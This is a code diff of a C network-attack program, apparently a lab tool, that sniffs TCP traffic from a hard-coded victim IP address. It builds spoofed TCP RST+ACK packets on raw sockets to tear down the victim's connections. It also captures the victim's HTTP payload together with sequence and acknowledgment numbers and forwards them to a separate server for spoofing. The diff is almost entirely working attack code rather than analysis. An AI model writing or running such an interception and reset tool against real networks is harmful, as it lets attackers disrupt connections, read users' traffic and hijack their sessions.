@@ -22,6 +22,16 @@
 #define VICTIM_IP "172.20.0.102"
 #define SIZE_ETHERNET 14
 
+// Save TCP connection state for more accurate spoofing
+struct tcp_conn_state {
+    uint32_t seq;
+    uint32_t ack;
+    uint16_t sport;
+    uint16_t dport;
+    uint16_t window;
+    uint8_t flags;
+};
+
 // Checksum calculation
 uint16_t chksum(unsigned char *buf, size_t buflen) {
     uint32_t sum = 0, i;
@@ -30,7 +40,7 @@ uint16_t chksum(unsigned char *buf, size_t buflen) {
     return ~((sum >> 16) + (sum & 0xffff));
 }
 
-void send_to_local_server(const char *msg) {
+void send_to_local_server(struct tcp_conn_state *state, const char *data, int data_len) {
     int sockfd;
     struct sockaddr_in servaddr;
     char recv_buffer[1024];
@@ -53,9 +63,25 @@ void send_to_local_server(const char *msg) {
     tv.tv_usec = 0;
     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
+    // Add connection state info to message
+    char message[4096];
+    snprintf(message, sizeof(message),
+            "VICTIM_HTTP\n"
+            "SEQ=%u\n"
+            "ACK=%u\n" 
+            "SPORT=%u\n"
+            "DPORT=%u\n"
+            "WINDOW=%u\n"
+            "FLAGS=0x%02x\n"
+            "DATA=%.*s",
+            state->seq, state->ack,
+            state->sport, state->dport,
+            state->window, state->flags,
+            data_len, data);
+
     // Send message
-    printf("\nSending to server: %s\n", msg);
-    if (sendto(sockfd, msg, strlen(msg), 0, 
+    printf("\nSending to server: %s\n", message);
+    if (sendto(sockfd, message, strlen(message), 0, 
         (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
         printf("Failed to send: %s\n", strerror(errno));
         close(sockfd);
@@ -112,113 +138,127 @@ void print_packet_content(unsigned char *buffer, int size) {
     printf("\n=====================\n");
 }
 
-// Thêm hàm gửi TCP reset để hủy kết nối gốc
+// Function to send TCP reset packet
+// This will terminate the original connection with server
 void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
-    debug_log("Sending TCP RST packet to %s:%d", 
-              inet_ntoa(*(struct in_addr*)&iph->saddr),
-              ntohs(tcph->th_sport));
+    printf("[INFO] Sending TCP RST packet from %s to %s\n",
+           inet_ntoa(*(struct in_addr*)&iph->daddr),
+           inet_ntoa(*(struct in_addr*)&iph->saddr));
+
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sock < 0) return;
+    if (sock < 0) {
+        perror("[ERROR] Socket creation failed");
+        return;
+    }
+
+    printf("[INFO] Raw socket created\n");
+
+    // Prepare RST packet buffer
     char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
     memset(packet, 0, sizeof(packet));
     struct iphdr *ip = (struct iphdr *)packet;
     struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
 
-    // Thiết lập IP header
+    // Setup IP header exactly like ICMP example
     ip->version = 4;
     ip->ihl = 5;
+    ip->tos = 0;
     ip->tot_len = htons(sizeof(packet));
     ip->id = htons(rand());
+    ip->frag_off = 0;
     ip->ttl = 64;
     ip->protocol = IPPROTO_TCP;
-    ip->saddr = iph->daddr;
+    ip->saddr = iph->daddr;  // Swap source and destination
     ip->daddr = iph->saddr;
-
-    // Thiết lập TCP header với flag RST+ACK
+    
+    // Setup TCP header with exact sequence numbers
     tcp->th_sport = tcph->th_dport;
     tcp->th_dport = tcph->th_sport;
     tcp->th_seq = tcph->th_ack;
-    tcp->th_ack = htonl(ntohl(tcph->th_seq) + 1); // tăng seq
+    tcp->th_ack = htonl(ntohl(tcph->th_seq) + 1);
     tcp->th_off = 5;
     tcp->th_flags = TH_RST | TH_ACK;
     tcp->th_win = 0;
 
+    // Calculate checksums
+    ip->check = 0;
+    ip->check = chksum((unsigned char *)ip, sizeof(struct iphdr));
+    
+    // Add TCP pseudo header checksum like ICMP example
+    struct pseudo_header {
+        uint32_t source_address;
+        uint32_t dest_address;
+        uint8_t placeholder;
+        uint8_t protocol;
+        uint16_t tcp_length;
+    } psh;
+
+    psh.source_address = ip->saddr;
+    psh.dest_address = ip->daddr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_length = htons(sizeof(struct tcphdr));
+
+    char *pseudogram = malloc(sizeof(psh) + sizeof(struct tcphdr));
+    memcpy(pseudogram, &psh, sizeof(psh));
+    memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr));
+    tcp->th_sum = chksum((unsigned char*)pseudogram, sizeof(psh) + sizeof(struct tcphdr));
+    free(pseudogram);
+
+    printf("[DEBUG] TCP RST packet created with SEQ=%u ACK=%u\n", 
+           ntohl(tcp->th_seq), ntohl(tcp->th_ack));
+
     struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
     dest.sin_family = AF_INET;
     dest.sin_addr.s_addr = ip->daddr;
-    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
-    close(sock);
-    // Add debug after sending
-    debug_log("TCP RST packet sent successfully");
-}
 
-// Add packet data dumping function
-void dump_http_data(unsigned char *data, int size) {
-    printf("\n=== HTTP Request Data ===\n");
-    printf("Raw data in hex:\n");
-    for(int i = 0; i < size; i++) {
-        printf("%02x ", data[i]);
-        if((i + 1) % 16 == 0) printf("\n");
-    }
-    
-    printf("\nData as ASCII:\n");
-    for(int i = 0; i < size; i++) {
-        if(data[i] >= 32 && data[i] <= 126) {
-            printf("%c", data[i]);
+    // Send RST packet multiple times like ICMP example
+    for(int i = 0; i < 3; i++) {
+        if (sendto(sock, packet, sizeof(packet), 0, 
+            (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+            perror("[ERROR] sendto() failed");
         } else {
-            printf(".");
+            printf("[SUCCESS] RST packet %d sent to %s\n", 
+                   i+1, inet_ntoa(dest.sin_addr));
         }
+        usleep(1000);
     }
-    printf("\n======================\n");
+
+    close(sock);
 }
 
 void process_packet(unsigned char *packet, int size) {
     struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
-    struct sockaddr_in source;
-    source.sin_addr.s_addr = iph->saddr;
+    
+    if (iph->protocol == IPPROTO_TCP) {
+        struct tcphdr *tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + iph->ihl*4);
+        struct sockaddr_in source;
+        source.sin_addr.s_addr = iph->saddr;
 
-    // Only process packets from victim
-    if (strcmp(inet_ntoa(source.sin_addr), VICTIM_IP) == 0) {
-        if (iph->protocol == IPPROTO_TCP) {
-            struct tcphdr *tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + (iph->ihl * 4));
-            int dest_port = ntohs(tcph->th_dport);
-            
-            if (dest_port == 80 || dest_port == 443) {
-                printf("\n[+] Intercepted HTTP(S) request from victim\n");
-                
-                // 1. First send RST to kill original connection
-                send_tcp_reset(iph, tcph);
-                
-                // 2. Extract HTTP data
-                int header_size = (iph->ihl * 4) + (tcph->th_off * 4);
-                unsigned char *data = packet + SIZE_ETHERNET + header_size;
-                int data_size = size - SIZE_ETHERNET - header_size;
+        if (strcmp(inet_ntoa(source.sin_addr), VICTIM_IP) == 0) {
+            printf("[INFO] TCP packet captured from %s:%d to port %d\n",
+                   VICTIM_IP, ntohs(tcph->th_sport), ntohs(tcph->th_dport));
 
-                if (data_size > 0) {
-                    dump_http_data(data, data_size);
-                }
+            // Store connection state
+            struct tcp_conn_state state = {
+                .seq = ntohl(tcph->th_seq),
+                .ack = ntohl(tcph->th_ack),
+                .sport = ntohs(tcph->th_sport),
+                .dport = ntohs(tcph->th_dport),
+                .window = ntohs(tcph->th_win),
+                .flags = tcph->th_flags
+            };
 
-                // 3. Notify local server
-                char message[2048];
-                snprintf(message, sizeof(message),
-                        "VICTIM_HTTP from %s:%d to port %d\n%.*s",
-                        VICTIM_IP, ntohs(tcph->th_sport), dest_port,
-                        data_size > 1024 ? 1024 : data_size,
-                        data);
-                send_to_local_server(message);
-                
-                printf("[+] Request forwarded to local server\n");
-                return; // Drop original packet
-            }
-        }
-    }
-    // Also drop packets from remote server to victim
-    else if (iph->protocol == IPPROTO_TCP) {
-        struct sockaddr_in dest;
-        dest.sin_addr.s_addr = iph->daddr;
-        if (strcmp(inet_ntoa(dest.sin_addr), VICTIM_IP) == 0) {
-            return; // Drop response packets
+            // Extract HTTP data
+            int header_size = SIZE_ETHERNET + (iph->ihl * 4) + (tcph->th_off * 4);
+            char *data = packet + header_size;
+            int data_len = size - header_size;
+
+            // First send RST to kill original connection
+            send_tcp_reset(iph, tcph);
+
+            // Then forward complete connection info to local server
+            send_to_local_server(&state, data, data_len);
         }
     }
 }
